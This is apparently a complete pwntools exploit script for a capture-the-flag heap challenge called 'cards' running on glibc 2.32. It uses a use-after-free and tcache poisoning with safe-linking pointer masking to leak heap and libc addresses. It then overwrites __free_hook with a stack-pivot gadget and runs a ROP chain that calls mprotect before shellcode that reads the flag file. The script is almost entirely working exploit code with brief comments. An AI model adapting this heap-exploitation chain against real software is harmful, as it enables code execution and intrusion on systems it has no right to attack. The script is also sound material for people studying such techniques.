from pwn import *
def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)

elf = change_ld('./cards', './ld-2.32.so')
libc = ELF("./libc-2.32.so")
ld = ELF("./ld-2.32.so")

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, env={"LD_PRELOAD": libc.path}, *a, **kw)
    else:
        return process([ld.path, elf.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)

gdbscript = '''
set env LD_PRELOAD=./libc-2.32.so
b puts
continue
'''.format(**locals())
io = start()
#io = remote("poseidonchalls.westeurope.cloudapp.azure.com",9004)
#######utils
def add(size,name):
	io.sendlineafter("Choice: ","1")
	io.sendafter("card: ",str(size))
	io.sendafter("color: ","HKHKHKH");	
	io.sendafter("name: ",name)

def view(idx):
	io.sendlineafter("Choice: ","4")
	io.sendafter("card: ",str(idx))

def remove(idx):
	io.sendlineafter("Choice: ","2")
	io.sendafter("card: ",str(idx))

def edit(idx,name):
	io.sendlineafter("Choice: ","3")
	io.sendafter("card: ",str(idx))
	io.sendafter("name: ",name)

def sendrop(rop):
	io.sendlineafter("Choice: ","6")
	io.sendafter("name: ",rop)

def mask(heapbase,target):
	return (heapbase >> 0xc) ^ target
#------------------------------------------------------
#UAF
#Glibc version 2.32 added a new check |chunk should be aligned| and free pointers gets masked.
#To bypass, this requires heap leak.
#Fast bin attack is now dead because of the alignment check.
##define PROTECT_PTR(pos, ptr) \
#  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
#------------------------------------------------------

####Addr
main_arena = 0x3b6ba0
free_hook = 0x3b8e80
mprotect = 0xf0830

####gadgets
add_rsp = 0x00077f66
pop_rdi = 0x001273dc
pop_rsi = 0x00126117
pop_rdx = 0x000c45ed

####exploit
add(0x28,"B"*0x28) #0
remove(0)
add(0x28,"A"*14+"BB") #1
view(1)
io.recvuntil("BB")
heap_base = u64(io.recvn(6)+b"\x00\x00")-0x2d0
print("Heap base: "+hex(heap_base))
add(0xd8,"HKHK")#2
add(0xd8,"HKHK")#3
remove(2)
remove(3)
target_ptr = mask(heap_base,heap_base+0x10)
edit(3,p64(target_ptr)) #uaf
add(0xd8,"/home/challenge/flag\x00")#4
add(0xf8,"HKHK")#5
add(0xd8,p64(0x0002000000000400)+p64(0x0)+p64(0x0)+p64(0x0000000700000000))#6 #set tcache-count of chunk 0x101 size to 7
remove(5) #remove chunk and get unsortedbin
edit(6,p64(0x00020000000000400)+p64(0x0)*3) #set tcache-count to back to 0
add(0x88,"AAAAAABB")#7 #leak libc now
view(7)
io.recvuntil("BB")
libc_base = u64(io.recvn(6)+b"\x00\x00") - 0x3b6c90
print("Libc: "+hex(libc_base))
edit(6,p64(0x00120000000000401)+p64(0x0)*15+p64(libc_base+free_hook))
add(0x18,p64(libc_base+add_rsp))#8
shellcode = asm("""
		xor rax, rax
		mov al, 0x2
		xor rsi, rsi
		xor rdx, rdx
		mov rdi, {}
		syscall
		mov r10, rax
		xor rax, rax
		mov rdi, r10
		mov rsi, {}
		mov rdx, 0x50
		syscall
		mov rax, 0x1
		mov rdi, rax
		syscall
		mov rax, 0x3c
		mov rdi, 0x1337
		syscall
		""".format(hex(heap_base+0x4d0), hex(heap_base+0x100)), arch='x86_64')
edit(7,shellcode)
mprotect_rop =  p64(libc_base+pop_rdi)+\
		p64(heap_base)+\
		p64(libc_base+pop_rsi)+\
		p64(0x1000)+\
		p64(libc_base+pop_rdx)+\
		p64(0x7)+\
		p64(libc_base+mprotect)+\
		p64(heap_base+0x610)
sendrop(mprotect_rop)
remove(4)
io.interactive()